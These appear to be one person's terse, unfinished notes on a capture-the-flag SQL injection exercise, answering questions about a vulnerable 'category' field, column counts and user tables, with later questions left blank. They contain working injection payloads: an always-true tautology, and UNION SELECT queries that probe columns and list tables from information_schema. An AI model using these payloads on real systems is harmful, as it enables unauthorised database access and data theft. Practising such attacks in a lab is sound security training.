q1. find vuln | category
i did `ram` and then ran the sql check for vuln.. `ram' or 1='1
found the flag at the bottom

q2. find the | columns
did a guessing game of how many columns there might be using
` UNION SELECT 1,2 #

q3. how many user created | tables
VC-096-ULTIMATE' UNION SELECT table_schema,table_name FROM information_schema.columns; #

q4. what permission level matches 'banned' | permission levels

q5. 

q6.

q7.

q8.
  
